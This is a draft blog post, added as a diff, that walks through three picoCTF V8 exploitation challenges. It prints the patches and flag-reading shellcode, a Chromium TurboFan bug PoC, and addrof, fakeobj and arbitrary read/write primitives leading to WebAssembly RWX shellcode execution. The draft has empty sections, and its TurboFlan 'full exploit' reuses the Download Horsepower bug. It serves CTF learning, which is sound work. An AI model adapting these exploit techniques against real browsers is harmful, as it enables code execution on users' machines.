@@ -1,0 +1,750 @@
+---
+title: 'picoctf v8 series'
+description: 'the picoctf v8 series'
+date: 2025-07-07
+tags: ['pwn', 'ctf', 'writeup']
+image: './v8.png'
+authors: ['jp']
+---
+
+# Background Information
+
+Hi, I've been interested in V8 recently and what better than learning v8 or at least an aspect of v8 security than doing some CTF challenges. picoCTF has a series of beginner v8 challs which I think is a pretty good progression from extremely easy to a bit more interesting.
+
+## Kit Engine
+
+> Start your engines!! d8 source.tar.gz server.py Connect at mercury.picoctf.net 62123
+
+Ok so we are provided a helpful `server.py`, `source.tar.gz` which holds the patch and build info, and `d8` binary which basically is the developer build of v8 that is compiled with the new patch.
+
+Before we start with any debugging or plan of exploitation, we should read the patch.
+
+```diff
+diff --git a/src/d8/d8.cc b/src/d8/d8.cc
+index e6fb20d152..35195b9261 100644
+--- a/src/d8/d8.cc
++++ b/src/d8/d8.cc
+@@ -979,6 +979,53 @@ struct ModuleResolutionData {
+ 
+ }  // namespace
+ 
++uint64_t doubleToUint64_t(double d){
++  union {
++    double d;
++    uint64_t u;
++  } conv = { .d = d };
++  return conv.u;
++}
++
++void Shell::Breakpoint(const v8::FunctionCallbackInfo<v8::Value>& args) {
++  __asm__("int3");
++}
++
++void Shell::AssembleEngine(const v8::FunctionCallbackInfo<v8::Value>& args) {
++  Isolate* isolate = args.GetIsolate();
++  if(args.Length() != 1) {
++    return;
++  }
++
++  double *func = (double *)mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
++  if (func == (double *)-1) {
++    printf("Unable to allocate memory. Contact admin\n");
++    return;
++  }
++
++  if (args[0]->IsArray()) {
++    Local<Array> arr = args[0].As<Array>();
++
++    Local<Value> element;
++    for (uint32_t i = 0; i < arr->Length(); i++) {
++      if (arr->Get(isolate->GetCurrentContext(), i).ToLocal(&element) && element->IsNumber()) {
++        Local<Number> val = element.As<Number>();
++        func[i] = val->Value();
++      }
++    }
++
++    printf("Memory Dump. Watch your endianness!!:\n");
++    for (uint32_t i = 0; i < arr->Length(); i++) {
++      printf("%d: float %f hex %lx\n", i, func[i], doubleToUint64_t(func[i]));
++    }
++
++    printf("Starting your engine!!\n");
++    void (*foo)() = (void(*)())func;
++    foo();
++  }
++  printf("Done\n");
++}
++
+ void Shell::ModuleResolutionSuccessCallback(
+     const FunctionCallbackInfo<Value>& info) {
+   std::unique_ptr<ModuleResolutionData> module_resolution_data(
+@@ -2201,40 +2248,15 @@ Local<String> Shell::Stringify(Isolate* isolate, Local<Value> value) {
+ 
+ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
+   Local<ObjectTemplate> global_template = ObjectTemplate::New(isolate);
+-  global_template->Set(Symbol::GetToStringTag(isolate),
+-                       String::NewFromUtf8Literal(isolate, "global"));
++  // Add challenge builtin, and remove some unintented solutions
++  global_template->Set(isolate, "AssembleEngine", FunctionTemplate::New(isolate, AssembleEngine));
++  global_template->Set(isolate, "Breakpoint", FunctionTemplate::New(isolate, Breakpoint));
+   global_template->Set(isolate, "version",
+                        FunctionTemplate::New(isolate, Version));
+-
+   global_template->Set(isolate, "print", FunctionTemplate::New(isolate, Print));
+-  global_template->Set(isolate, "printErr",
+-                       FunctionTemplate::New(isolate, PrintErr));
+-  global_template->Set(isolate, "write", FunctionTemplate::New(isolate, Write));
+-  global_template->Set(isolate, "read", FunctionTemplate::New(isolate, Read));
+-  global_template->Set(isolate, "readbuffer",
+-                       FunctionTemplate::New(isolate, ReadBuffer));
+-  global_template->Set(isolate, "readline",
+-                       FunctionTemplate::New(isolate, ReadLine));
+-  global_template->Set(isolate, "load", FunctionTemplate::New(isolate, Load));
+-  global_template->Set(isolate, "setTimeout",
+-                       FunctionTemplate::New(isolate, SetTimeout));
+-  // Some Emscripten-generated code tries to call 'quit', which in turn would
+-  // call C's exit(). This would lead to memory leaks, because there is no way
+-  // we can terminate cleanly then, so we need a way to hide 'quit'.
+   if (!options.omit_quit) {
+     global_template->Set(isolate, "quit", FunctionTemplate::New(isolate, Quit));
+   }
+-  global_template->Set(isolate, "testRunner",
+-                       Shell::CreateTestRunnerTemplate(isolate));
+-  global_template->Set(isolate, "Realm", Shell::CreateRealmTemplate(isolate));
+-  global_template->Set(isolate, "performance",
+-                       Shell::CreatePerformanceTemplate(isolate));
+-  global_template->Set(isolate, "Worker", Shell::CreateWorkerTemplate(isolate));
+-  // Prevent fuzzers from creating side effects.
+-  if (!i::FLAG_fuzzing) {
+-    global_template->Set(isolate, "os", Shell::CreateOSTemplate(isolate));
+-  }
+-  global_template->Set(isolate, "d8", Shell::CreateD8Template(isolate));
+ 
+ #ifdef V8_FUZZILLI
+   global_template->Set(
+@@ -2243,11 +2265,6 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
+       FunctionTemplate::New(isolate, Fuzzilli), PropertyAttribute::DontEnum);
+ #endif  // V8_FUZZILLI
+ 
+-  if (i::FLAG_expose_async_hooks) {
+-    global_template->Set(isolate, "async_hooks",
+-                         Shell::CreateAsyncHookTemplate(isolate));
+-  }
+-
+   return global_template;
+ }
+ 
+@@ -2449,10 +2466,10 @@ void Shell::Initialize(Isolate* isolate, D8Console* console,
+             v8::Isolate::kMessageLog);
+   }
+ 
+-  isolate->SetHostImportModuleDynamicallyCallback(
++  /*isolate->SetHostImportModuleDynamicallyCallback(
+       Shell::HostImportModuleDynamically);
+   isolate->SetHostInitializeImportMetaObjectCallback(
+-      Shell::HostInitializeImportMetaObject);
++      Shell::HostInitializeImportMetaObject);*/
+ 
+ #ifdef V8_FUZZILLI
+   // Let the parent process (Fuzzilli) know we are ready.
+diff --git a/src/d8/d8.h b/src/d8/d8.h
+index a6a1037cff..4591d27f65 100644
+--- a/src/d8/d8.h
++++ b/src/d8/d8.h
+@@ -413,6 +413,9 @@ class Shell : public i::AllStatic {
+     kNoProcessMessageQueue = false
+   };
+ 
++  static void AssembleEngine(const v8::FunctionCallbackInfo<v8::Value>& args);
++  static void Breakpoint(const v8::FunctionCallbackInfo<v8::Value>& args);
++
+   static bool ExecuteString(Isolate* isolate, Local<String> source,
+                             Local<Value> name, PrintResult print_result,
+                             ReportExceptions report_exceptions,
+
+```
+
+Ok, this is a pretty simple bug. There is a new AssembleEngine() functions which takes in an float array, and mmap's it to RWX memory. It then executes it. Essentially the plan here is to translate shellcode bytes into floats, then send it as an array to AssembleEngine(), which then runs the shellcode.
+
+Ok so we can easily craft the shellcode `cat flag.txt`, as `/bin/sh` had some instability. And with a little helper functions to convert hex ints to floats, we easily get the flag... not too bad!
+
+```js
+var buf = new ArrayBuffer(8);
+var f64_buf = new Float64Array(buf);
+var u64_buf = new Uint32Array(buf);
+
+function itof(val) {
+    //typeof(val) = BigInt 64-bit values
+    u64_buf[0] = Number(val & 0xffffffffn);
+    u64_buf[1] = Number(val >> 32n);
+    return f64_buf[0];
+}
+
+payload = [0x66b848240cfe016an, 0x507478742e67616cn, 0xf631e7894858026an, 0x7fffffffba41050fn, 0x016a58286ac68948n, 0x90909090050f995fn]
+payload_float = []
+
+for (let i = 0; i < payload.length; i++) {
+    payload_float.push(itof(payload[i]))
+}
+
+AssembleEngine(payload_float)
+```
+
+And we get the flag: `picoCTF{vr00m_vr00m_30abad0d522d3b14}`
+
+## Download Horsepower
+
+> Gotta go fast d8 source.tar.gz server.py Connect at mercury.picoctf.net 1684
+
+### reading the patch
+
+Ok let's read the patch now. 
+
+```diff
+diff --git a/BUILD.gn b/BUILD.gn
+index 9482b977e3..6a3f1e2d0f 100644
+--- a/BUILD.gn
++++ b/BUILD.gn
+@@ -1175,6 +1175,7 @@ action("postmortem-metadata") {
+ }
+ 
+ torque_files = [
++  "src/builtins/array-horsepower.tq",
+   "src/builtins/aggregate-error.tq",
+   "src/builtins/array-at.tq",
+   "src/builtins/array-copywithin.tq",
+diff --git a/src/builtins/array-horsepower.tq b/src/builtins/array-horsepower.tq
+new file mode 100644
+index 0000000000..7ea53ca306
+--- /dev/null
++++ b/src/builtins/array-horsepower.tq
+@@ -0,0 +1,17 @@
++// Gotta go fast!!
++
++namespace array {
++
++transitioning javascript builtin
++ArraySetHorsepower(
++  js-implicit context: NativeContext, receiver: JSAny)(horsepower: JSAny): JSAny {
++    try {
++      const h: Smi = Cast<Smi>(horsepower) otherwise End;
++      const a: JSArray = Cast<JSArray>(receiver) otherwise End;
++      a.SetLength(h);
++    } label End {
++        Print("Improper attempt to set horsepower");
++    }
++    return receiver;
++}
++}
+\ No newline at end of file
+diff --git a/src/d8/d8.cc b/src/d8/d8.cc
+index e6fb20d152..abfb553864 100644
+--- a/src/d8/d8.cc
++++ b/src/d8/d8.cc
+@@ -999,6 +999,10 @@ void Shell::ModuleResolutionSuccessCallback(
+   resolver->Resolve(realm, module_namespace).ToChecked();
+ }
+ 
++void Shell::Breakpoint(const v8::FunctionCallbackInfo<v8::Value>& args) {
++  __asm__("int3");
++}
++
+ void Shell::ModuleResolutionFailureCallback(
+     const FunctionCallbackInfo<Value>& info) {
+   std::unique_ptr<ModuleResolutionData> module_resolution_data(
+@@ -2201,40 +2205,14 @@ Local<String> Shell::Stringify(Isolate* isolate, Local<Value> value) {
+ 
+ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
+   Local<ObjectTemplate> global_template = ObjectTemplate::New(isolate);
+-  global_template->Set(Symbol::GetToStringTag(isolate),
+-                       String::NewFromUtf8Literal(isolate, "global"));
++  // Remove some unintented solutions
++  global_template->Set(isolate, "Breakpoint", FunctionTemplate::New(isolate, Breakpoint));
+   global_template->Set(isolate, "version",
+                        FunctionTemplate::New(isolate, Version));
+-
+   global_template->Set(isolate, "print", FunctionTemplate::New(isolate, Print));
+-  global_template->Set(isolate, "printErr",
+-                       FunctionTemplate::New(isolate, PrintErr));
+-  global_template->Set(isolate, "write", FunctionTemplate::New(isolate, Write));
+-  global_template->Set(isolate, "read", FunctionTemplate::New(isolate, Read));
+-  global_template->Set(isolate, "readbuffer",
+-                       FunctionTemplate::New(isolate, ReadBuffer));
+-  global_template->Set(isolate, "readline",
+-                       FunctionTemplate::New(isolate, ReadLine));
+-  global_template->Set(isolate, "load", FunctionTemplate::New(isolate, Load));
+-  global_template->Set(isolate, "setTimeout",
+-                       FunctionTemplate::New(isolate, SetTimeout));
+-  // Some Emscripten-generated code tries to call 'quit', which in turn would
+-  // call C's exit(). This would lead to memory leaks, because there is no way
+-  // we can terminate cleanly then, so we need a way to hide 'quit'.
+   if (!options.omit_quit) {
+     global_template->Set(isolate, "quit", FunctionTemplate::New(isolate, Quit));
+   }
+-  global_template->Set(isolate, "testRunner",
+-                       Shell::CreateTestRunnerTemplate(isolate));
+-  global_template->Set(isolate, "Realm", Shell::CreateRealmTemplate(isolate));
+-  global_template->Set(isolate, "performance",
+-                       Shell::CreatePerformanceTemplate(isolate));
+-  global_template->Set(isolate, "Worker", Shell::CreateWorkerTemplate(isolate));
+-  // Prevent fuzzers from creating side effects.
+-  if (!i::FLAG_fuzzing) {
+-    global_template->Set(isolate, "os", Shell::CreateOSTemplate(isolate));
+-  }
+-  global_template->Set(isolate, "d8", Shell::CreateD8Template(isolate));
+ 
+ #ifdef V8_FUZZILLI
+   global_template->Set(
+@@ -2243,11 +2221,6 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
+       FunctionTemplate::New(isolate, Fuzzilli), PropertyAttribute::DontEnum);
+ #endif  // V8_FUZZILLI
+ 
+-  if (i::FLAG_expose_async_hooks) {
+-    global_template->Set(isolate, "async_hooks",
+-                         Shell::CreateAsyncHookTemplate(isolate));
+-  }
+-
+   return global_template;
+ }
+ 
+@@ -2449,10 +2422,10 @@ void Shell::Initialize(Isolate* isolate, D8Console* console,
+             v8::Isolate::kMessageLog);
+   }
+ 
+-  isolate->SetHostImportModuleDynamicallyCallback(
++  /*isolate->SetHostImportModuleDynamicallyCallback(
+       Shell::HostImportModuleDynamically);
+   isolate->SetHostInitializeImportMetaObjectCallback(
+-      Shell::HostInitializeImportMetaObject);
++      Shell::HostInitializeImportMetaObject);*/
+ 
+ #ifdef V8_FUZZILLI
+   // Let the parent process (Fuzzilli) know we are ready.
+diff --git a/src/d8/d8.h b/src/d8/d8.h
+index a6a1037cff..7cf66d285a 100644
+--- a/src/d8/d8.h
++++ b/src/d8/d8.h
+@@ -413,6 +413,8 @@ class Shell : public i::AllStatic {
+     kNoProcessMessageQueue = false
+   };
+ 
++  static void Breakpoint(const v8::FunctionCallbackInfo<v8::Value>& args);
++
+   static bool ExecuteString(Isolate* isolate, Local<String> source,
+                             Local<Value> name, PrintResult print_result,
+                             ReportExceptions report_exceptions,
+diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
+index ce3886e87e..6621a79618 100644
+--- a/src/init/bootstrapper.cc
++++ b/src/init/bootstrapper.cc
+@@ -1754,6 +1754,8 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
+     JSObject::AddProperty(isolate_, proto, factory->constructor_string(),
+                           array_function, DONT_ENUM);
+ 
++    SimpleInstallFunction(isolate_, proto, "setHorsepower",
++                          Builtins::kArraySetHorsepower, 1, false);
+     SimpleInstallFunction(isolate_, proto, "concat", Builtins::kArrayConcat, 1,
+                           false);
+     SimpleInstallFunction(isolate_, proto, "copyWithin",
+diff --git a/src/objects/js-array.tq b/src/objects/js-array.tq
+index b18f5bafac..b466b330cd 100644
+--- a/src/objects/js-array.tq
++++ b/src/objects/js-array.tq
+@@ -28,6 +28,9 @@ extern class JSArray extends JSObject {
+   macro IsEmpty(): bool {
+     return this.length == 0;
+   }
++  macro SetLength(l: Smi) {
++    this.length = l;
++  }
+   length: Number;
+ }
+ 
+```
+
+Ok, we got a function called `setHorsepower()` that seems to utilize the new builtin `ArraySetHorsepower()`, the bug is a little bit more subtle than simply MMAP'ing our shellcode to a RWX page, so let's be more thorough.
+
+```c++
+ArraySetHorsepower(
+  js-implicit context: NativeContext, receiver: JSAny)(horsepower: JSAny): JSAny {
+    try {
+      const h: Smi = Cast<Smi>(horsepower) otherwise End;
+      const a: JSArray = Cast<JSArray>(receiver) otherwise End;
+      a.SetLength(h);
+    } label End {
+        Print("Improper attempt to set horsepower");
+    }
+    return receiver;
+}
+```
+
+The function appears to set the length of the array, but there doesn't seem to be any checks on whether the size set is valid. This introduces an **oob** read and write vulnerability.
+
+### what is beyond an array in javascript
+
+
+
+### the fakeobj and addrof primitives
+### gaining arbitrary r/w
+### shellcode execution using web assembly
+
+Resources: https://www.jackfromeast.site/blog/PatriotCTF-2024-babyxss, https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/
+
+## TurboFlan
+
+> A Radiant Gourmet Flan told our young Turboflan hero to stop rushing and slow down. Has he listened? d8 source.tar.gz server.py Connect at mercury.picoctf.net 23694
+
+### reading the patch
+
+So the patch is essentially a one-liner. 
+
+```diff
+diff --git a/src/compiler/effect-control-linearizer.cc b/src/compiler/effect-control-linearizer.cc
+index d64c3c80e5..6bbd1e98b0 100644
+--- a/src/compiler/effect-control-linearizer.cc
++++ b/src/compiler/effect-control-linearizer.cc
+@@ -1866,8 +1866,9 @@ void EffectControlLinearizer::LowerCheckMaps(Node* node, Node* frame_state) {
+       Node* map = __ HeapConstant(maps[i]);
+       Node* check = __ TaggedEqual(value_map, map);
+       if (i == map_count - 1) {
+-        __ DeoptimizeIfNot(DeoptimizeReason::kWrongMap, p.feedback(), check,
+-                           frame_state, IsSafetyCheck::kCriticalSafetyCheck);
++        // This makes me slow down! Can't have! Gotta go fast!!
++        // __ DeoptimizeIfNot(DeoptimizeReason::kWrongMap, p.feedback(), check,
++        //                     frame_state, IsSafetyCheck::kCriticalSafetyCheck);
+       } else {
+         auto next_map = __ MakeLabel();
+         __ BranchWithCriticalSafetyCheck(check, &done, &next_map);
+@@ -1888,8 +1889,8 @@ void EffectControlLinearizer::LowerCheckMaps(Node* node, Node* frame_state) {
+       Node* check = __ TaggedEqual(value_map, map);
+ 
+       if (i == map_count - 1) {
+-        __ DeoptimizeIfNot(DeoptimizeReason::kWrongMap, p.feedback(), check,
+-                           frame_state, IsSafetyCheck::kCriticalSafetyCheck);
++        // __ DeoptimizeIfNot(DeoptimizeReason::kWrongMap, p.feedback(), check,
++        //                     frame_state, IsSafetyCheck::kCriticalSafetyCheck);
+       } else {
+         auto next_map = __ MakeLabel();
+         __ BranchWithCriticalSafetyCheck(check, &done, &next_map);
+diff --git a/src/d8/d8.cc b/src/d8/d8.cc
+index 999e8c2b96..72b729d94e 100644
+--- a/src/d8/d8.cc
++++ b/src/d8/d8.cc
+@@ -1107,6 +1107,11 @@ void Shell::ModuleResolutionSuccessCallback(
+   resolver->Resolve(realm, module_namespace).ToChecked();
+ }
+ 
++void Shell::Breakpoint(const v8::FunctionCallbackInfo<v8::Value>& args) {
++  __asm__("int3");
++}
++
++
+ void Shell::ModuleResolutionFailureCallback(
+     const FunctionCallbackInfo<Value>& info) {
+   std::unique_ptr<ModuleResolutionData> module_resolution_data(
+@@ -2425,40 +2430,12 @@ Local<String> Shell::Stringify(Isolate* isolate, Local<Value> value) {
+ 
+ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
+   Local<ObjectTemplate> global_template = ObjectTemplate::New(isolate);
+-  global_template->Set(Symbol::GetToStringTag(isolate),
+-                       String::NewFromUtf8Literal(isolate, "global"));
++  // Remove some unintented solutions
+   global_template->Set(isolate, "version",
+                        FunctionTemplate::New(isolate, Version));
++  global_template->Set(isolate, "Breakpoint", FunctionTemplate::New(isolate, Breakpoint));
+ 
+   global_template->Set(isolate, "print", FunctionTemplate::New(isolate, Print));
+-  global_template->Set(isolate, "printErr",
+-                       FunctionTemplate::New(isolate, PrintErr));
+-  global_template->Set(isolate, "write", FunctionTemplate::New(isolate, Write));
+-  global_template->Set(isolate, "read", FunctionTemplate::New(isolate, Read));
+-  global_template->Set(isolate, "readbuffer",
+-                       FunctionTemplate::New(isolate, ReadBuffer));
+-  global_template->Set(isolate, "readline",
+-                       FunctionTemplate::New(isolate, ReadLine));
+-  global_template->Set(isolate, "load", FunctionTemplate::New(isolate, Load));
+-  global_template->Set(isolate, "setTimeout",
+-                       FunctionTemplate::New(isolate, SetTimeout));
+-  // Some Emscripten-generated code tries to call 'quit', which in turn would
+-  // call C's exit(). This would lead to memory leaks, because there is no way
+-  // we can terminate cleanly then, so we need a way to hide 'quit'.
+-  if (!options.omit_quit) {
+-    global_template->Set(isolate, "quit", FunctionTemplate::New(isolate, Quit));
+-  }
+-  global_template->Set(isolate, "testRunner",
+-                       Shell::CreateTestRunnerTemplate(isolate));
+-  global_template->Set(isolate, "Realm", Shell::CreateRealmTemplate(isolate));
+-  global_template->Set(isolate, "performance",
+-                       Shell::CreatePerformanceTemplate(isolate));
+-  global_template->Set(isolate, "Worker", Shell::CreateWorkerTemplate(isolate));
+-  // Prevent fuzzers from creating side effects.
+-  if (!i::FLAG_fuzzing) {
+-    global_template->Set(isolate, "os", Shell::CreateOSTemplate(isolate));
+-  }
+-  global_template->Set(isolate, "d8", Shell::CreateD8Template(isolate));
+ 
+ #ifdef V8_FUZZILLI
+   global_template->Set(
+@@ -2467,11 +2444,6 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
+       FunctionTemplate::New(isolate, Fuzzilli), PropertyAttribute::DontEnum);
+ #endif  // V8_FUZZILLI
+ 
+-  if (i::FLAG_expose_async_hooks) {
+-    global_template->Set(isolate, "async_hooks",
+-                         Shell::CreateAsyncHookTemplate(isolate));
+-  }
+-
+   return global_template;
+ }
+ 
+@@ -2673,10 +2645,10 @@ void Shell::Initialize(Isolate* isolate, D8Console* console,
+             v8::Isolate::kMessageLog);
+   }
+ 
+-  isolate->SetHostImportModuleDynamicallyCallback(
+-      Shell::HostImportModuleDynamically);
+-  isolate->SetHostInitializeImportMetaObjectCallback(
+-      Shell::HostInitializeImportMetaObject);
++  // isolate->SetHostImportModuleDynamicallyCallback(
++  //     Shell::HostImportModuleDynamically);
++  // isolate->SetHostInitializeImportMetaObjectCallback(
++  //     Shell::HostInitializeImportMetaObject);
+ 
+ #ifdef V8_FUZZILLI
+   // Let the parent process (Fuzzilli) know we are ready.
+diff --git a/src/d8/d8.h b/src/d8/d8.h
+index a9f6f3bc8b..2513761fa6 100644
+--- a/src/d8/d8.h
++++ b/src/d8/d8.h
+@@ -415,6 +415,8 @@ class Shell : public i::AllStatic {
+     kNoProcessMessageQueue = false
+   };
+ 
++  static void Breakpoint(const v8::FunctionCallbackInfo<v8::Value>& args);
++
+   static bool ExecuteString(Isolate* isolate, Local<String> source,
+                             Local<Value> name, PrintResult print_result,
+                             ReportExceptions report_exceptions,
+
+```
+
+### tldr on turbofan
+
+(for a more detailed explanation please refer to https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/ and more)
+
+TurboFan is an optimizing JIT compiler for V8. It enhances the speed in which javascript code is executed. I won't really go super in-depth but I'll just go through the basic v8 turbofan optimization "pipeline".
+
+Before TurboFan is used, v8 first generates ignition bytecode. Then TurboFan is used to optimize "hot functions", aka functions that get executed a lot. TurboFan compiles code based on types it has seen used previously (which I assume is with the function calls). If an optimized function encounters a different type, it will most likely deoptimize the function to avoid type confusion. 
+
+### type confusion vulnerability
+
+We note that in the patch, the deoptimization is "patched out", which leaves TurboFan with only optimization. We can use this to our advantage by making our optimized function return a different value than an "unoptimized" function.
+
+Why is this important? Well if we can successfully trigger a type confusion, we might be able to corrupt an array's length, which as you remember from Download Horsepower, allows us to gain an OOB r/w, which we can eventually leverage into a full RCE.
+
+### finding an appropriate cve
+
+Well, since I'm not really creative I went searching for an appropriate type confusion vulnerability. I came across this issue: https://issues.chromium.org/issues/40055451, which is a type confusion from Int64 values to Int32 values due to TurboFan's optimization.
+
+We can check the poc, which is 
+
+```js
+function foo(a) {
+  let y = (new Date(42)).getMilliseconds();
+
+  let i = -1;
+  if (a) i = 0xffffffff;
+
+  return Math.max(1 << y, i, 1 + y) > y;
+}
+
+console.log(foo(true)); /* true */
+
+%PrepareFunctionForOptimization(foo);
+foo(false);
+
+%OptimizeFunctionOnNextCall(foo);
+console.log(foo(true)); /* false */
+```
+
+(The % stuff is just debug functions, make sure to run d8 with `--allow-natives-syntax` as a flag.) Upon running it with our provided d8 binary, we can see that the poc is successful! 
+
+[PLACE IMAGE HERE]
+
+Due to the removal of deopimization, TurboFan incorrectly returns false upon optimization when the unoptimized (or probably correct) return value should be true.
+
+To be honest, this might also be an inherent bug with v8 even without the removal of the optimization patch, since the bug report appears to have been created like right after that year's picoctf lmao. In the poc, another bug was used: https://issues.chromium.org/issues/40055540
+
+Nevertheless, let's build out the primitives.
+
+### primitives
+
+We can use the flt array as our fakeobj (i think based on some comparison with diff v8 writeups although Im not entirely sure if fakeobj is even used), and reference an arbitrary address. We can utilize the JIT optimization and array shift bug to get an OOB array and an addrof() primitive.
+
+```js
+function foo(a) {
+  let x = 0xffffffff;
+  if (a) x = -1;
+
+  let z = Math.max(0, x);
+  z = 0 - z; 
+  z = Math.sign(z);
+
+  let cor = new Array(z);
+  cor.shift();
+
+  let oob = [1.1, 2.2, 3.3];
+  return { cor, oob };
+}
+
+for (let i = 0; i < 100000; i++)
+  foo(true);
+
+let { cor, oob } = foo(false);
+cor[16] = 1337;
+
+let flt = [1.1];
+let tmp = {a: 1};
+let obj = [tmp];
+
+function addrof(o) {
+  let a = ftoi(oob[22]) >> 32n;
+  let b = ftoi(oob[10]) & 0xffffffffn;
+  oob[10] = itof((a << 32n) + b);
+  obj[0] = o;
+  return (ftoi(flt[0]) & 0xffffffffn) - 1n;
+}
+```
+
+### gaining arb r/w
+
+Let's build out the read and write capabilities: 
+
+```js
+function read(p) {
+  let a = ftoi(oob[10]) & 0xffffffffn;
+  oob[10] = itof(((p - 8n + 1n) << 32n) + a);
+  return ftoi(flt[0]);
+}
+
+function write(p, x) {
+  let a = ftoi(oob[10]) & 0xffffffffn;
+  oob[10] = itof(((p - 8n + 1n) << 32n) + a);
+  flt[0] = itof(x);
+}
+```
+
+Let's test the read and write: 
+
+```js
+```
+
+### shellcode execution using web assembly (again)
+
+Just like in Download Horsepower, we can leak the backing_store pointer of an arraybuffer, and overwrite it with the RWX page, then write our shellcode to the arraybuffer. All we need to do is find the appropriate offset
+
+Full exploit: 
+
+```js
+var buf = new ArrayBuffer(8);
+var f64_buf = new Float64Array(buf);
+var u64_buf = new Uint32Array(buf);
+
+function ftoi(val) {
+  f64_buf[0] = val;
+  return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
+}
+
+function itof(val) {
+  u64_buf[0] = Number(val & 0xffffffffn);
+  u64_buf[1] = Number(val >> 32n);
+  return f64_buf[0];
+}
+
+var arr_float_oob = [1.1];
+var temp_obj = {"A":1};
+var arr_object = [temp_obj];
+var arr_float = [1.1, 1.2];
+// do the oob
+arr_float_oob.setHorsepower(100);
+
+function hex(x) {
+  return `0x${x.toString(16)}`;
+}
+
+function addrof(object) {
+  arr_object[0] = object;
+  let address = ftoi(arr_float_oob[9]) >> 32n;
+  arr_object[0] = temp_obj;
+  return address;
+}
+
+function fakeobj(addr) {
+  const tmp = ftoi(arr_float_oob[9]) & 0xffffffffn;
+  arr_float_oob[9] = itof(tmp + (addr << 32n));
+  return arr_object[0];
+}
+
+var map_arr_float = arr_float_oob[15];
+
+function arb_read(addr) {
+  arr_float[0] = map_arr_float;
+  arr_float[1] = itof(0x0000000200000000n + addr - 0x8n);
+  const fake = fakeobj(addrof(arr_float) - 0x10n);
+  return ftoi(fake[0]);
+}
+
+function arb_write(addr, val) {
+  arr_float[0] = map_arr_float;
+  arr_float[1] = itof(0x0000000200000000n + addr - 0x8n);
+  const fake = fakeobj(addrof(arr_float) - 0x10n);
+  fake[0] = itof(val);
+}
+
+var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+var wasm_mod = new WebAssembly.Module(wasm_code);
+var wasm_instance = new WebAssembly.Instance(wasm_mod);
+var f = wasm_instance.exports.main;
+
+shellcode = [0x0cfe016a, 0x2fb84824, 0x2f6e6962, 0x50746163, 0x68e78948, 0x7478742e, 0x0101b848, 0x01010101, 0x48500101, 0x756062b8, 0x606d6701, 0x04314866, 0x56f63124, 0x485e0c6a, 0x6a56e601, 0x01485e10, 0x894856e6, 0x6ad231e6, 0x050f583b]
+var rwx_page_addr = arb_read(addrof(wasm_instance)+0x68n);
+console.log("[+] RWX Wasm page addr: 0x" + rwx_page_addr.toString(16));
+
+function copy_shellcode(addr, shellcode) {
+  let buf_ex = new ArrayBuffer(100);
+  let dataview = new DataView(buf_ex);
+
+  let buf_addr = addrof(buf_ex);
+  let backing_store_addr = buf_addr + 0x14n;
+  //the arb write is def making it crash rn... FUCKKKKK
+  arb_write(backing_store_addr, addr);
+  // now the fucking offset is outside of bounds???
+  let new_backing = arb_read(backing_store_addr);
+  console.log(`[DEBUG] New backing store: ${hex(new_backing)}`);
+  for (let i = 0; i < shellcode.length; i++) {
+      dataview.setUint32(4*i, shellcode[i], true);
+  }
+  
+}
+
+console.log("[+] Copying cat flag shellcode to RWX page");
+copy_shellcode(rwx_page_addr, shellcode);
+console.log("[+] hopefully cat flag...");
+f();
+while(1){}; //for reliability
+```
+
+And we get the flag: `picoCTF{Good_job!_Now_go_find_a_real_v8_cve!_be6ab909622dd072}`
+
+Reading List: 
+- https://issues.chromium.org/issues/40055451
+- https://anvbis.au/posts/root-cause-analysis-of-cve-2021-21224/
+- https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/
+- https://www.jaybosamiya.com/blog/2019/01/02/krautflare/
+- https://v8.dev/docs/turbofan
+- https://github.com/pranayga/expl0ring_V8/blob/master/docs/Turbofan.md
+- https://starlabs.sg/blog/2022/12-deconstructing-and-exploiting-cve-2020-6418/
+
+## Conclusion
+
+This honestly was pretty fun to learn and solve! This definitely demystified v8 a bit. Maybe in future ctfs I can maybe tackle v8 a bit. I'll be moving on to the v8 quarterly quiz on pwn.college in the meanwhile and probably get back to practicing blockchain pwnables. But who knows, maybe I might want to write a nice simple v8 challenge in picoCTF 2026. ![think](https://cdn.discordapp.com/emojis/1221993567925309491.webp?size=48&name=think~1)
